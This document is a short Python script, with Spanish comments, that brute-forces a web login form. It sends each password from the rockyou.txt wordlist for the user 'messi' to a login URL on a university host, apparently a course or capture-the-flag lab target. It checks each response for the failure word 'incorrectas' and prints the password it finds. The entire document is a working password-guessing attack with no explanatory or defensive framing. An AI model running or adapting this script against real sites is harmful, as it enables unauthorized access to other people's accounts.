import requests
import time

url = 'https://jajackers.dsa.linti.unlp.edu.ar/login'
username = 'messi'
diccionario = './rockyou.txt'

with open(diccionario, 'r', encoding='latin-1') as f:
    for i, password in enumerate(f):
        password = password.strip()

        try:
            response = requests.post(url, data={
                'username': username,
                'password': password
            }, timeout=5)  # Opcional: establecer timeout

            if "incorrectas" not in response.text:
                print(f"[+] Contraseña encontrada: {password}")
                break

        except requests.exceptions.RequestException as e:
            print(f"[!] Error con la contraseña '{password}': {e}")
            continue  # Saltar e intentar con la siguiente contraseña

        if i % 50 == 0:
            print(f"Probadas {i} contraseñas...")

    else:
        print("[-] Contraseña no encontrada en el diccionario.")

